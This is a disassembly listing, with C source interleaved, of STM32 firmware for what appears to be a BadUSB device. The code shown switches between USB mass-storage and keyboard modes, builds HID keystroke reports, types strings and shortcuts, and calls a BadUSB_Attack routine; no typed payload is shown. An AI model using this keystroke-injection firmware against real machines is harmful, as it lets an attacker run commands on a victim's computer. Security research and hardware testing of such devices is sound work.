 800062a:	d1fc      	bne.n	8000626 <main+0x9e>
				  SwitchToHID();
 800062c:	f000 f88a 	bl	8000744 <SwitchToHID>
				  BadUSB_Attack(1);
 8000630:	2001      	movs	r0, #1
 8000632:	f000 fa7d 	bl	8000b30 <BadUSB_Attack>
				  break;
 8000636:	bf00      	nop
		  flag = 0;
 8000638:	2300      	movs	r3, #0
 800063a:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 800063c:	f000 f89a 	bl	8000774 <SwitchToMSC>
	  InterruptTrap(&InterruptFlag);
 8000640:	e7bd      	b.n	80005be <main+0x36>
 8000642:	bf00      	nop
 8000644:	20000978 	.word	0x20000978
 8000648:	2000025c 	.word	0x2000025c
 800064c:	20000270 	.word	0x20000270
 8000650:	40022000 	.word	0x40022000

08000654 <SystemClock_Config>:
/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
 8000654:	b580      	push	{r7, lr}
 8000656:	b096      	sub	sp, #88	; 0x58
 8000658:	af00      	add	r7, sp, #0
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
 800065a:	f107 0314 	add.w	r3, r7, #20
 800065e:	2244      	movs	r2, #68	; 0x44
 8000660:	2100      	movs	r1, #0
 8000662:	4618      	mov	r0, r3
 8000664:	f00c fda2 	bl	800d1ac <memset>
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
 8000668:	463b      	mov	r3, r7
 800066a:	2200      	movs	r2, #0
 800066c:	601a      	str	r2, [r3, #0]
 800066e:	605a      	str	r2, [r3, #4]
 8000670:	609a      	str	r2, [r3, #8]
 8000672:	60da      	str	r2, [r3, #12]
 8000674:	611a      	str	r2, [r3, #16]

  /** Configure the main internal regulator output voltage
  */
  if (HAL_PWREx_ControlVoltageScaling(PWR_REGULATOR_VOLTAGE_SCALE1) != HAL_OK)
 8000676:	f44f 7000 	mov.w	r0, #512	; 0x200
 800067a:	f003 f99f 	bl	80039bc <HAL_PWREx_ControlVoltageScaling>
 800067e:	4603      	mov	r3, r0
 8000680:	2b00      	cmp	r3, #0
 8000682:	d001      	beq.n	8000688 <SystemClock_Config+0x34>
  {
    Error_Handler();
 8000684:	f000 fbe4 	bl	8000e50 <Error_Handler>
  }

  /** Configure LSE Drive Capability
  */
  HAL_PWR_EnableBkUpAccess();
 8000688:	f003 f97a 	bl	8003980 <HAL_PWR_EnableBkUpAccess>
  __HAL_RCC_LSEDRIVE_CONFIG(RCC_LSEDRIVE_LOW);
 800068c:	4b21      	ldr	r3, [pc, #132]	; (8000714 <SystemClock_Config+0xc0>)
 800068e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8000692:	4a20      	ldr	r2, [pc, #128]	; (8000714 <SystemClock_Config+0xc0>)
 8000694:	f023 0318 	bic.w	r3, r3, #24
 8000698:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_LSE|RCC_OSCILLATORTYPE_MSI;
 800069c:	2314      	movs	r3, #20
 800069e:	617b      	str	r3, [r7, #20]
  RCC_OscInitStruct.LSEState = RCC_LSE_ON;
 80006a0:	2301      	movs	r3, #1
 80006a2:	61fb      	str	r3, [r7, #28]
  RCC_OscInitStruct.MSIState = RCC_MSI_ON;
 80006a4:	2301      	movs	r3, #1
 80006a6:	62fb      	str	r3, [r7, #44]	; 0x2c
  RCC_OscInitStruct.MSICalibrationValue = 0;
 80006a8:	2300      	movs	r3, #0
 80006aa:	633b      	str	r3, [r7, #48]	; 0x30
  RCC_OscInitStruct.MSIClockRange = RCC_MSIRANGE_6;
 80006ac:	2360      	movs	r3, #96	; 0x60
 80006ae:	637b      	str	r3, [r7, #52]	; 0x34
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
 80006b0:	2302      	movs	r3, #2
 80006b2:	63fb      	str	r3, [r7, #60]	; 0x3c
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_MSI;
 80006b4:	2301      	movs	r3, #1
 80006b6:	643b      	str	r3, [r7, #64]	; 0x40
  RCC_OscInitStruct.PLL.PLLM = 1;
 80006b8:	2301      	movs	r3, #1
 80006ba:	647b      	str	r3, [r7, #68]	; 0x44
  RCC_OscInitStruct.PLL.PLLN = 24;
 80006bc:	2318      	movs	r3, #24
 80006be:	64bb      	str	r3, [r7, #72]	; 0x48
  RCC_OscInitStruct.PLL.PLLP = RCC_PLLP_DIV7;
 80006c0:	2307      	movs	r3, #7
 80006c2:	64fb      	str	r3, [r7, #76]	; 0x4c
  RCC_OscInitStruct.PLL.PLLQ = RCC_PLLQ_DIV2;
 80006c4:	2302      	movs	r3, #2
 80006c6:	653b      	str	r3, [r7, #80]	; 0x50
  RCC_OscInitStruct.PLL.PLLR = RCC_PLLR_DIV2;
 80006c8:	2302      	movs	r3, #2
 80006ca:	657b      	str	r3, [r7, #84]	; 0x54
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
 80006cc:	f107 0314 	add.w	r3, r7, #20
 80006d0:	4618      	mov	r0, r3
 80006d2:	f003 f9d9 	bl	8003a88 <HAL_RCC_OscConfig>
 80006d6:	4603      	mov	r3, r0
 80006d8:	2b00      	cmp	r3, #0
 80006da:	d001      	beq.n	80006e0 <SystemClock_Config+0x8c>
  {
    Error_Handler();
 80006dc:	f000 fbb8 	bl	8000e50 <Error_Handler>
  }

  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
 80006e0:	230f      	movs	r3, #15
 80006e2:	603b      	str	r3, [r7, #0]
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
 80006e4:	2303      	movs	r3, #3
 80006e6:	607b      	str	r3, [r7, #4]
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
 80006e8:	2300      	movs	r3, #0
 80006ea:	60bb      	str	r3, [r7, #8]
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
 80006ec:	2300      	movs	r3, #0
 80006ee:	60fb      	str	r3, [r7, #12]
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;
 80006f0:	2300      	movs	r3, #0
 80006f2:	613b      	str	r3, [r7, #16]

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
 80006f4:	463b      	mov	r3, r7
 80006f6:	2102      	movs	r1, #2
 80006f8:	4618      	mov	r0, r3
 80006fa:	f003 fdd9 	bl	80042b0 <HAL_RCC_ClockConfig>
 80006fe:	4603      	mov	r3, r0
 8000700:	2b00      	cmp	r3, #0
 8000702:	d001      	beq.n	8000708 <SystemClock_Config+0xb4>
  {
    Error_Handler();
 8000704:	f000 fba4 	bl	8000e50 <Error_Handler>
  }

  /** Enable MSI Auto calibration
  */
  HAL_RCCEx_EnableMSIPLLMode();
 8000708:	f004 f9ec 	bl	8004ae4 <HAL_RCCEx_EnableMSIPLLMode>
}
 800070c:	bf00      	nop
 800070e:	3758      	adds	r7, #88	; 0x58
 8000710:	46bd      	mov	sp, r7
 8000712:	bd80      	pop	{r7, pc}
 8000714:	40021000 	.word	0x40021000

08000718 <SimulateUSB_unplug>:

/* USER CODE BEGIN 4 */
void SimulateUSB_unplug(){
 8000718:	b580      	push	{r7, lr}
 800071a:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_RESET);
 800071c:	2200      	movs	r2, #0
 800071e:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 8000722:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000726:	f001 fb4f 	bl	8001dc8 <HAL_GPIO_WritePin>
}
 800072a:	bf00      	nop
 800072c:	bd80      	pop	{r7, pc}

0800072e <SimulateUSB_plugin>:

void SimulateUSB_plugin(){
 800072e:	b580      	push	{r7, lr}
 8000730:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_SET);
 8000732:	2201      	movs	r2, #1
 8000734:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 8000738:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 800073c:	f001 fb44 	bl	8001dc8 <HAL_GPIO_WritePin>
}
 8000740:	bf00      	nop
 8000742:	bd80      	pop	{r7, pc}

08000744 <SwitchToHID>:

void SwitchToHID(){
 8000744:	b580      	push	{r7, lr}
 8000746:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 8000748:	f7ff ffe6 	bl	8000718 <SimulateUSB_unplug>
	isMSC = 0;
 800074c:	4b08      	ldr	r3, [pc, #32]	; (8000770 <SwitchToHID+0x2c>)
 800074e:	2200      	movs	r2, #0
 8000750:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 8000752:	2032      	movs	r0, #50	; 0x32
 8000754:	f000 fe20 	bl	8001398 <HAL_Delay>
	SimulateUSB_plugin();
 8000758:	f7ff ffe9 	bl	800072e <SimulateUSB_plugin>
	MX_TIM2_Init();
 800075c:	f000 fc72 	bl	8001044 <MX_TIM2_Init>
	MX_USB_DEVICE_Init();
 8000760:	f00b feec 	bl	800c53c <MX_USB_DEVICE_Init>
	HAL_Delay(SwitchDeviceSlot);
 8000764:	f640 30b8 	movw	r0, #3000	; 0xbb8
 8000768:	f000 fe16 	bl	8001398 <HAL_Delay>
}
 800076c:	bf00      	nop
 800076e:	bd80      	pop	{r7, pc}
 8000770:	20000978 	.word	0x20000978

08000774 <SwitchToMSC>:

void SwitchToMSC(){
 8000774:	b580      	push	{r7, lr}
 8000776:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 8000778:	f7ff ffce 	bl	8000718 <SimulateUSB_unplug>
	isMSC = 1;
 800077c:	4b07      	ldr	r3, [pc, #28]	; (800079c <SwitchToMSC+0x28>)
 800077e:	2201      	movs	r2, #1
 8000780:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 8000782:	2032      	movs	r0, #50	; 0x32
 8000784:	f000 fe08 	bl	8001398 <HAL_Delay>
	SimulateUSB_plugin();
 8000788:	f7ff ffd1 	bl	800072e <SimulateUSB_plugin>
	MX_USB_DEVICE_Init_MSC();
 800078c:	f00b ff06 	bl	800c59c <MX_USB_DEVICE_Init_MSC>
	HAL_Delay(SwitchDeviceSlot);
 8000790:	f640 30b8 	movw	r0, #3000	; 0xbb8
 8000794:	f000 fe00 	bl	8001398 <HAL_Delay>
}
 8000798:	bf00      	nop
 800079a:	bd80      	pop	{r7, pc}
 800079c:	20000978 	.word	0x20000978

080007a0 <Get_Single_Descriptor>:

void Get_Single_Descriptor(uint8_t ascii){
 80007a0:	b580      	push	{r7, lr}
 80007a2:	b0a4      	sub	sp, #144	; 0x90
 80007a4:	af00      	add	r7, sp, #0
 80007a6:	4603      	mov	r3, r0
 80007a8:	71fb      	strb	r3, [r7, #7]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80007aa:	220f      	movs	r2, #15
 80007ac:	2100      	movs	r1, #0
 80007ae:	4821      	ldr	r0, [pc, #132]	; (8000834 <Get_Single_Descriptor+0x94>)
 80007b0:	f00c fcfc 	bl	800d1ac <memset>
	uint8_t Map[MapLen] = Map_Init;
 80007b4:	4a20      	ldr	r2, [pc, #128]	; (8000838 <Get_Single_Descriptor+0x98>)
 80007b6:	f107 0308 	add.w	r3, r7, #8
 80007ba:	4611      	mov	r1, r2
 80007bc:	2286      	movs	r2, #134	; 0x86
 80007be:	4618      	mov	r0, r3
 80007c0:	f00c fd20 	bl	800d204 <memcpy>
	Convert2CapsMap(Map);
 80007c4:	f107 0308 	add.w	r3, r7, #8
 80007c8:	4618      	mov	r0, r3
 80007ca:	f000 f93f 	bl	8000a4c <Convert2CapsMap>
	uint8_t pos = Map[ascii];
 80007ce:	79fb      	ldrb	r3, [r7, #7]
 80007d0:	3390      	adds	r3, #144	; 0x90
 80007d2:	443b      	add	r3, r7
 80007d4:	f813 3c88 	ldrb.w	r3, [r3, #-136]
 80007d8:	f887 308f 	strb.w	r3, [r7, #143]	; 0x8f
	sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 80007dc:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007e0:	091b      	lsrs	r3, r3, #4
 80007e2:	b2db      	uxtb	r3, r3
 80007e4:	461a      	mov	r2, r3
 80007e6:	4b13      	ldr	r3, [pc, #76]	; (8000834 <Get_Single_Descriptor+0x94>)
 80007e8:	5c9b      	ldrb	r3, [r3, r2]
 80007ea:	b25a      	sxtb	r2, r3
 80007ec:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007f0:	f003 0307 	and.w	r3, r3, #7
 80007f4:	2101      	movs	r1, #1
 80007f6:	fa01 f303 	lsl.w	r3, r1, r3
 80007fa:	b25b      	sxtb	r3, r3
 80007fc:	4313      	orrs	r3, r2
 80007fe:	b259      	sxtb	r1, r3
 8000800:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000804:	091b      	lsrs	r3, r3, #4
 8000806:	b2db      	uxtb	r3, r3
 8000808:	461a      	mov	r2, r3
 800080a:	b2c9      	uxtb	r1, r1
 800080c:	4b09      	ldr	r3, [pc, #36]	; (8000834 <Get_Single_Descriptor+0x94>)
 800080e:	5499      	strb	r1, [r3, r2]
	if((pos&0x08) == 8)
 8000810:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000814:	f003 0308 	and.w	r3, r3, #8
 8000818:	2b00      	cmp	r3, #0
 800081a:	d006      	beq.n	800082a <Get_Single_Descriptor+0x8a>
		sent_buffer[0] |= 0x02;
 800081c:	4b05      	ldr	r3, [pc, #20]	; (8000834 <Get_Single_Descriptor+0x94>)
 800081e:	781b      	ldrb	r3, [r3, #0]
 8000820:	f043 0302 	orr.w	r3, r3, #2
 8000824:	b2da      	uxtb	r2, r3
 8000826:	4b03      	ldr	r3, [pc, #12]	; (8000834 <Get_Single_Descriptor+0x94>)
 8000828:	701a      	strb	r2, [r3, #0]
}
 800082a:	bf00      	nop
 800082c:	3790      	adds	r7, #144	; 0x90
 800082e:	46bd      	mov	sp, r7
 8000830:	bd80      	pop	{r7, pc}
 8000832:	bf00      	nop
 8000834:	2000025c 	.word	0x2000025c
 8000838:	0800d238 	.word	0x0800d238

0800083c <Get_Multi_Descriptor>:

/*Designed for shortcut key combinations to obtain data packets:
 * for simultaneously pressing multiple keys*/
void Get_Multi_Descriptor(uint8_t *array, int num){
 800083c:	b580      	push	{r7, lr}
 800083e:	b0a6      	sub	sp, #152	; 0x98
 8000840:	af00      	add	r7, sp, #0
 8000842:	6078      	str	r0, [r7, #4]
 8000844:	6039      	str	r1, [r7, #0]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000846:	220f      	movs	r2, #15
 8000848:	2100      	movs	r1, #0
 800084a:	482a      	ldr	r0, [pc, #168]	; (80008f4 <Get_Multi_Descriptor+0xb8>)
 800084c:	f00c fcae 	bl	800d1ac <memset>
	uint8_t Map[MapLen] = Map_Init;
 8000850:	4a29      	ldr	r2, [pc, #164]	; (80008f8 <Get_Multi_Descriptor+0xbc>)
 8000852:	f107 030c 	add.w	r3, r7, #12
 8000856:	4611      	mov	r1, r2
 8000858:	2286      	movs	r2, #134	; 0x86
 800085a:	4618      	mov	r0, r3
 800085c:	f00c fcd2 	bl	800d204 <memcpy>
	Convert2CapsMap(Map);
 8000860:	f107 030c 	add.w	r3, r7, #12
 8000864:	4618      	mov	r0, r3
 8000866:	f000 f8f1 	bl	8000a4c <Convert2CapsMap>
	for(int i = 0; i < num; i++){
 800086a:	2300      	movs	r3, #0
 800086c:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 8000870:	e036      	b.n	80008e0 <Get_Multi_Descriptor+0xa4>
		uint8_t pos = Map[array[i]];
 8000872:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 8000876:	687a      	ldr	r2, [r7, #4]
 8000878:	4413      	add	r3, r2
 800087a:	781b      	ldrb	r3, [r3, #0]
 800087c:	3398      	adds	r3, #152	; 0x98
 800087e:	443b      	add	r3, r7
 8000880:	f813 3c8c 	ldrb.w	r3, [r3, #-140]
 8000884:	f887 3093 	strb.w	r3, [r7, #147]	; 0x93
		sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 8000888:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 800088c:	091b      	lsrs	r3, r3, #4
 800088e:	b2db      	uxtb	r3, r3
 8000890:	461a      	mov	r2, r3
 8000892:	4b18      	ldr	r3, [pc, #96]	; (80008f4 <Get_Multi_Descriptor+0xb8>)
 8000894:	5c9b      	ldrb	r3, [r3, r2]
 8000896:	b25a      	sxtb	r2, r3
 8000898:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 800089c:	f003 0307 	and.w	r3, r3, #7
 80008a0:	2101      	movs	r1, #1
 80008a2:	fa01 f303 	lsl.w	r3, r1, r3
 80008a6:	b25b      	sxtb	r3, r3
 80008a8:	4313      	orrs	r3, r2
 80008aa:	b259      	sxtb	r1, r3
 80008ac:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 80008b0:	091b      	lsrs	r3, r3, #4
 80008b2:	b2db      	uxtb	r3, r3
 80008b4:	461a      	mov	r2, r3
 80008b6:	b2c9      	uxtb	r1, r1
 80008b8:	4b0e      	ldr	r3, [pc, #56]	; (80008f4 <Get_Multi_Descriptor+0xb8>)
 80008ba:	5499      	strb	r1, [r3, r2]
		if((pos&0x08) == 8)
 80008bc:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 80008c0:	f003 0308 	and.w	r3, r3, #8
 80008c4:	2b00      	cmp	r3, #0
 80008c6:	d006      	beq.n	80008d6 <Get_Multi_Descriptor+0x9a>
			sent_buffer[0] |= 0x02;
 80008c8:	4b0a      	ldr	r3, [pc, #40]	; (80008f4 <Get_Multi_Descriptor+0xb8>)
 80008ca:	781b      	ldrb	r3, [r3, #0]
 80008cc:	f043 0302 	orr.w	r3, r3, #2
 80008d0:	b2da      	uxtb	r2, r3
 80008d2:	4b08      	ldr	r3, [pc, #32]	; (80008f4 <Get_Multi_Descriptor+0xb8>)
 80008d4:	701a      	strb	r2, [r3, #0]
	for(int i = 0; i < num; i++){
 80008d6:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 80008da:	3301      	adds	r3, #1
 80008dc:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 80008e0:	f8d7 2094 	ldr.w	r2, [r7, #148]	; 0x94
 80008e4:	683b      	ldr	r3, [r7, #0]
 80008e6:	429a      	cmp	r2, r3
 80008e8:	dbc3      	blt.n	8000872 <Get_Multi_Descriptor+0x36>
	}
}
 80008ea:	bf00      	nop
 80008ec:	bf00      	nop
 80008ee:	3798      	adds	r7, #152	; 0x98
 80008f0:	46bd      	mov	sp, r7
 80008f2:	bd80      	pop	{r7, pc}
 80008f4:	2000025c 	.word	0x2000025c
 80008f8:	0800d238 	.word	0x0800d238

080008fc <SimulateKeyPress>:

void SimulateKeyPress(uint8_t ascii){
 80008fc:	b580      	push	{r7, lr}
 80008fe:	b082      	sub	sp, #8
 8000900:	af00      	add	r7, sp, #0
 8000902:	4603      	mov	r3, r0
 8000904:	71fb      	strb	r3, [r7, #7]
	//get key:ascii Descriptor
	Get_Single_Descriptor(ascii);
 8000906:	79fb      	ldrb	r3, [r7, #7]
 8000908:	4618      	mov	r0, r3
 800090a:	f7ff ff49 	bl	80007a0 <Get_Single_Descriptor>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800090e:	220f      	movs	r2, #15
 8000910:	4903      	ldr	r1, [pc, #12]	; (8000920 <SimulateKeyPress+0x24>)
 8000912:	4804      	ldr	r0, [pc, #16]	; (8000924 <SimulateKeyPress+0x28>)
 8000914:	f008 f950 	bl	8008bb8 <USBD_CUSTOM_HID_SendReport>
}
 8000918:	bf00      	nop
 800091a:	3708      	adds	r7, #8
 800091c:	46bd      	mov	sp, r7
 800091e:	bd80      	pop	{r7, pc}
 8000920:	2000025c 	.word	0x2000025c
 8000924:	200003c0 	.word	0x200003c0

08000928 <SimulateKeyRelease>:

void SimulateKeyRelease(){
 8000928:	b580      	push	{r7, lr}
 800092a:	af00      	add	r7, sp, #0
	//set 0
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800092c:	220f      	movs	r2, #15
 800092e:	2100      	movs	r1, #0
 8000930:	4804      	ldr	r0, [pc, #16]	; (8000944 <SimulateKeyRelease+0x1c>)
 8000932:	f00c fc3b 	bl	800d1ac <memset>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000936:	220f      	movs	r2, #15
 8000938:	4902      	ldr	r1, [pc, #8]	; (8000944 <SimulateKeyRelease+0x1c>)
 800093a:	4803      	ldr	r0, [pc, #12]	; (8000948 <SimulateKeyRelease+0x20>)
 800093c:	f008 f93c 	bl	8008bb8 <USBD_CUSTOM_HID_SendReport>
}
 8000940:	bf00      	nop
 8000942:	bd80      	pop	{r7, pc}
 8000944:	2000025c 	.word	0x2000025c
 8000948:	200003c0 	.word	0x200003c0

0800094c <SimulateKeyStroke>:

void SimulateKeyStroke(uint8_t ascii){
 800094c:	b580      	push	{r7, lr}
 800094e:	b082      	sub	sp, #8
 8000950:	af00      	add	r7, sp, #0
 8000952:	4603      	mov	r3, r0
 8000954:	71fb      	strb	r3, [r7, #7]
	SimulateKeyPress(ascii);
 8000956:	79fb      	ldrb	r3, [r7, #7]
 8000958:	4618      	mov	r0, r3
 800095a:	f7ff ffcf 	bl	80008fc <SimulateKeyPress>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 800095e:	2023      	movs	r0, #35	; 0x23
 8000960:	f000 fd1a 	bl	8001398 <HAL_Delay>
	SimulateKeyRelease();
 8000964:	f7ff ffe0 	bl	8000928 <SimulateKeyRelease>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000968:	2023      	movs	r0, #35	; 0x23
 800096a:	f000 fd15 	bl	8001398 <HAL_Delay>
}
 800096e:	bf00      	nop
 8000970:	3708      	adds	r7, #8
 8000972:	46bd      	mov	sp, r7
 8000974:	bd80      	pop	{r7, pc}
	...

08000978 <SimulateShortcutKey>:

void SimulateShortcutKey(uint8_t *array, int num){
 8000978:	b580      	push	{r7, lr}
 800097a:	b082      	sub	sp, #8
 800097c:	af00      	add	r7, sp, #0
 800097e:	6078      	str	r0, [r7, #4]
 8000980:	6039      	str	r1, [r7, #0]
	Get_Multi_Descriptor(array, num);
 8000982:	6839      	ldr	r1, [r7, #0]
 8000984:	6878      	ldr	r0, [r7, #4]
 8000986:	f7ff ff59 	bl	800083c <Get_Multi_Descriptor>
	while((recv_buffer[0]&0x02) != 0x02){
 800098a:	e002      	b.n	8000992 <SimulateShortcutKey+0x1a>
		SimulateKeyStroke(128);
 800098c:	2080      	movs	r0, #128	; 0x80
 800098e:	f7ff ffdd 	bl	800094c <SimulateKeyStroke>
	while((recv_buffer[0]&0x02) != 0x02){
 8000992:	4b0c      	ldr	r3, [pc, #48]	; (80009c4 <SimulateShortcutKey+0x4c>)
 8000994:	781b      	ldrb	r3, [r3, #0]
 8000996:	f003 0302 	and.w	r3, r3, #2
 800099a:	2b00      	cmp	r3, #0
 800099c:	d0f6      	beq.n	800098c <SimulateShortcutKey+0x14>
	}
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800099e:	220f      	movs	r2, #15
 80009a0:	4909      	ldr	r1, [pc, #36]	; (80009c8 <SimulateShortcutKey+0x50>)
 80009a2:	480a      	ldr	r0, [pc, #40]	; (80009cc <SimulateShortcutKey+0x54>)
 80009a4:	f008 f908 	bl	8008bb8 <USBD_CUSTOM_HID_SendReport>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 80009a8:	2023      	movs	r0, #35	; 0x23
 80009aa:	f000 fcf5 	bl	8001398 <HAL_Delay>
	SimulateKeyRelease();
 80009ae:	f7ff ffbb 	bl	8000928 <SimulateKeyRelease>
	HAL_Delay(ShortcutSlot); //Wait to avoid conflict
 80009b2:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 80009b6:	f000 fcef 	bl	8001398 <HAL_Delay>
}
 80009ba:	bf00      	nop
 80009bc:	3708      	adds	r7, #8
 80009be:	46bd      	mov	sp, r7
 80009c0:	bd80      	pop	{r7, pc}
 80009c2:	bf00      	nop
 80009c4:	2000026c 	.word	0x2000026c
 80009c8:	2000025c 	.word	0x2000025c
 80009cc:	200003c0 	.word	0x200003c0

080009d0 <SimulateKeyStrokes>:

void SimulateKeyStrokes(char *str, int len, int *cntNow){
 80009d0:	b580      	push	{r7, lr}
 80009d2:	b084      	sub	sp, #16
 80009d4:	af00      	add	r7, sp, #0
 80009d6:	60f8      	str	r0, [r7, #12]
 80009d8:	60b9      	str	r1, [r7, #8]
 80009da:	607a      	str	r2, [r7, #4]
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 80009dc:	687b      	ldr	r3, [r7, #4]
 80009de:	2200      	movs	r2, #0
 80009e0:	601a      	str	r2, [r3, #0]
 80009e2:	e025      	b.n	8000a30 <SimulateKeyStrokes+0x60>
    	//Ensure func SimulateKeyStroke is executed in uppercase environment.
		if((recv_buffer[0]&0x02) != 0x02){
 80009e4:	4b17      	ldr	r3, [pc, #92]	; (8000a44 <SimulateKeyStrokes+0x74>)
 80009e6:	781b      	ldrb	r3, [r3, #0]
 80009e8:	f003 0302 	and.w	r3, r3, #2
 80009ec:	2b00      	cmp	r3, #0
 80009ee:	d102      	bne.n	80009f6 <SimulateKeyStrokes+0x26>
			SimulateKeyStroke(128);
 80009f0:	2080      	movs	r0, #128	; 0x80
 80009f2:	f7ff ffab 	bl	800094c <SimulateKeyStroke>
    	}
		SimulateKeyStroke(str[*cntNow]);
 80009f6:	687b      	ldr	r3, [r7, #4]
 80009f8:	681b      	ldr	r3, [r3, #0]
 80009fa:	461a      	mov	r2, r3
 80009fc:	68fb      	ldr	r3, [r7, #12]
 80009fe:	4413      	add	r3, r2
 8000a00:	781b      	ldrb	r3, [r3, #0]
 8000a02:	4618      	mov	r0, r3
 8000a04:	f7ff ffa2 	bl	800094c <SimulateKeyStroke>
		//Determine if RollBack is necessary
		if(NeedRollBack == 1){
 8000a08:	4b0f      	ldr	r3, [pc, #60]	; (8000a48 <SimulateKeyStrokes+0x78>)
 8000a0a:	681b      	ldr	r3, [r3, #0]
 8000a0c:	2b01      	cmp	r3, #1
 8000a0e:	d10a      	bne.n	8000a26 <SimulateKeyStrokes+0x56>
			NeedRollBack = 0;
 8000a10:	4b0d      	ldr	r3, [pc, #52]	; (8000a48 <SimulateKeyStrokes+0x78>)
 8000a12:	2200      	movs	r2, #0
 8000a14:	601a      	str	r2, [r3, #0]
			(*cntNow)--;
 8000a16:	687b      	ldr	r3, [r7, #4]
 8000a18:	681b      	ldr	r3, [r3, #0]
 8000a1a:	1e5a      	subs	r2, r3, #1
 8000a1c:	687b      	ldr	r3, [r7, #4]
 8000a1e:	601a      	str	r2, [r3, #0]
			SimulateKeyStroke(129);
 8000a20:	2081      	movs	r0, #129	; 0x81
 8000a22:	f7ff ff93 	bl	800094c <SimulateKeyStroke>
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 8000a26:	687b      	ldr	r3, [r7, #4]
 8000a28:	681b      	ldr	r3, [r3, #0]
 8000a2a:	1c5a      	adds	r2, r3, #1
 8000a2c:	687b      	ldr	r3, [r7, #4]
 8000a2e:	601a      	str	r2, [r3, #0]
 8000a30:	687b      	ldr	r3, [r7, #4]
 8000a32:	681b      	ldr	r3, [r3, #0]
 8000a34:	68ba      	ldr	r2, [r7, #8]
 8000a36:	429a      	cmp	r2, r3
 8000a38:	dcd4      	bgt.n	80009e4 <SimulateKeyStrokes+0x14>
		}
	}
}
 8000a3a:	bf00      	nop
 8000a3c:	bf00      	nop
 8000a3e:	3710      	adds	r7, #16
 8000a40:	46bd      	mov	sp, r7
 8000a42:	bd80      	pop	{r7, pc}
 8000a44:	2000026c 	.word	0x2000026c
 8000a48:	2000027c 	.word	0x2000027c

08000a4c <Convert2CapsMap>:
		SimulateKeyStroke(128);
		PrintRecvBuf(recv_buffer);  //print Keyboard LED Status
	}
}

void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]){
 8000a4c:	b480      	push	{r7}
 8000a4e:	b085      	sub	sp, #20
 8000a50:	af00      	add	r7, sp, #0
 8000a52:	6078      	str	r0, [r7, #4]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 8000a54:	2341      	movs	r3, #65	; 0x41
 8000a56:	73fb      	strb	r3, [r7, #15]
 8000a58:	e01a      	b.n	8000a90 <Convert2CapsMap+0x44>
		LowerCaseMap[cnt] &= 0xf7;
 8000a5a:	7bfb      	ldrb	r3, [r7, #15]
 8000a5c:	687a      	ldr	r2, [r7, #4]
